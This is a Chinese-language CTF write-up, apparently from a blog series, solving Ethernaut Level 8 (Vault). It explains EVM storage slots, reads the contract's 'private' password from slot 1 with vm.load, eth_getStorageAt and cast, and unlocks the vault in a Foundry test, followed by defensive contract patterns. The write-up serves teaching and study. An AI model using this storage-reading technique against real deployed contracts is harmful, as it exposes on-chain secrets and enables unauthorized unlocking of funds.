---
title: 'Ethernaut Level 8: Vault - 私有变量读取'
date: 2025-01-25 15:30:00
updated: 2025-01-25 15:30:00
categories:
  - Ethernaut 系列
  - 基础攻击篇 (1-10)
tags:
  - Ethernaut
  - Foundry
  - 私有变量读取
  - 智能合约安全
  - Solidity
  - Storage
series: Ethernaut Foundry Solutions
excerpt: "深入学习区块链存储机制和私有变量读取攻击，掌握 Vault 关卡的攻击技术和防护措施。理解 EVM 存储布局和 eth_getStorageAt 的使用。"
---

# 🎯 Ethernaut Level 8: Vault - 私有变量读取

> **关卡链接**: [Ethernaut Level 8 - Vault](https://ethernaut.openzeppelin.com/level/8)  
> **攻击类型**: 私有变量读取  
> **难度**: ⭐⭐⭐☆☆

## 📋 挑战目标

要 unlock 这个合约账户，也就是要找到 password。挑战的关键在于理解区块链上没有真正的"私有"数据，所有状态变量都可以被读取。

![Vault Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg)

## 🔍 漏洞分析

### 存储机制 (Storage)

我们需要理解 EVM 中存储的布局以及原理（使用 32 字节大小的插槽）和 JSON RPC 函数 `eth_getStorageAt`。

EVM 的数据都存在 32 字节槽中：
- 第一个状态变量存储在槽位 0
- 如果第一个变量存储完了还有足够的字节，下一个变量也存储在 slot 0
- 否则存储在 slot 1，依此类推

> **注意**: 像数组和字符串这样的动态类型工作方式不同

在 Vault 合约中：
- `locked` 是一个布尔值，使用 1 字节，存储在 slot 0
- `password` 是一个 bytes32，使用 32 个字节
- 由于插槽 0 中剩余的 31 个字节无法容纳 password，因此它被存储在 slot 1 中

### 读取 Storage

`eth_getStorageAt` JSON RPC 函数可用于读取合约在给定槽位的存储。

使用 web3.js 读取 slot 1 的合约存储：

```javascript
web3.eth.getStorageAt(contractAddress, 1, (err, result) => {
  console.log(result);
});
```

在 Foundry 中，可以使用 cheatcodes 中的 load：

```solidity
bytes32 password = vm.load(address(instance), bytes32(uint256(1)));
```

## 💻 Foundry 实现

### 攻击合约代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/VaultFactory.sol";

contract VaultTest is Test {
    Ethernaut ethernaut;
    VaultFactory vaultFactory;
    
    function setUp() public {
        ethernaut = new Ethernaut();
        vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
    }
    
    function testVaultExploit() public {
        // 创建关卡实例
        address levelInstance = ethernaut.createLevelInstance(vaultFactory);
        Vault instance = Vault(levelInstance);
        
        // 验证初始状态
        assertEq(instance.locked(), true);
        
        // 攻击：读取存储在 slot 1 中的密码
        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));
        
        // 使用读取的密码解锁
        instance.unlock(password);
        
        // 验证攻击成功
        assertEq(instance.locked(), false);
        
        // 提交关卡
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelInstance)
        );
        assert(levelSuccessfullyPassed);
    }
}
```

### 关键攻击步骤

1. **分析存储布局**：确定 password 存储在 slot 1
2. **读取存储**：使用 `vm.load()` 读取 slot 1 的数据
3. **调用 unlock**：使用读取的密码解锁合约

```solidity
// 读取 slot 1 中的密码
bytes32 password = vm.load(address(instance), bytes32(uint256(1)));

// 解锁合约
instance.unlock(password);

// 验证解锁成功
assertEq(instance.locked(), false);
```

## 🛡️ 防御措施

### 1. 避免在链上存储敏感数据

```solidity
// ❌ 不安全：密码存储在链上
contract VulnerableVault {
    bytes32 private password;  // 可以被读取！
    
    constructor(bytes32 _password) {
        password = _password;
    }
}

// ✅ 安全：使用哈希验证
contract SecureVault {
    bytes32 private passwordHash;  // 存储哈希而不是明文
    
    constructor(bytes32 _passwordHash) {
        passwordHash = _passwordHash;
    }
    
    function unlock(string memory _password) public {
        require(keccak256(abi.encodePacked(_password)) == passwordHash, "Wrong password");
        // unlock logic
    }
}
```

### 2. 使用提交-揭示方案

```solidity
contract CommitRevealVault {
    mapping(address => bytes32) private commitments;
    
    // 第一阶段：提交哈希
    function commit(bytes32 _commitment) public {
        commitments[msg.sender] = _commitment;
    }
    
    // 第二阶段：揭示并验证
    function reveal(string memory _password, uint256 _nonce) public {
        bytes32 hash = keccak256(abi.encodePacked(_password, _nonce));
        require(commitments[msg.sender] == hash, "Invalid reveal");
        // unlock logic
    }
}
```

### 3. 使用链下验证

```solidity
contract OffChainVault {
    address private authorizedSigner;
    mapping(address => bool) private unlocked;
    
    function unlock(bytes memory signature, address user) public {
        bytes32 messageHash = keccak256(abi.encodePacked(user, "unlock"));
        address signer = recoverSigner(messageHash, signature);
        require(signer == authorizedSigner, "Unauthorized");
        unlocked[user] = true;
    }
}
```

## 🔧 相关工具和技术

### 存储读取工具

```bash
# 使用 cast 读取存储
cast storage <CONTRACT_ADDRESS> <SLOT_NUMBER>

# 使用 web3.py
from web3 import Web3
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))
password = w3.eth.get_storage_at(contract_address, 1)
```

### 存储布局分析

```solidity
// 使用 forge inspect 查看存储布局
// forge inspect <CONTRACT> storage-layout
```

## 🎯 总结

**核心概念**:
- `private` 关键字意味着数据只能由合约本身访问，而不是对外界隐藏
- 区块链上没有什么是私有的，一切都是公开的，任何人都可以阅读
- EVM 存储使用 32 字节的插槽系统

**攻击向量**:
- 直接读取合约存储
- 分析存储布局确定敏感数据位置
- 使用 RPC 调用或 Foundry cheatcodes 读取数据

**防御策略**:
- 永远不要在链上存储明文敏感数据
- 使用哈希和承诺方案
- 考虑链下验证机制
- 实施适当的访问控制

---

## 🔗 相关链接

- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**
- **[上一关: Level 7 - Force](/2025/01/25/ethernaut-level-07-force/)**
- **[下一关: Level 9 - King](/2025/01/25/ethernaut-level-09-king/)**
- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**

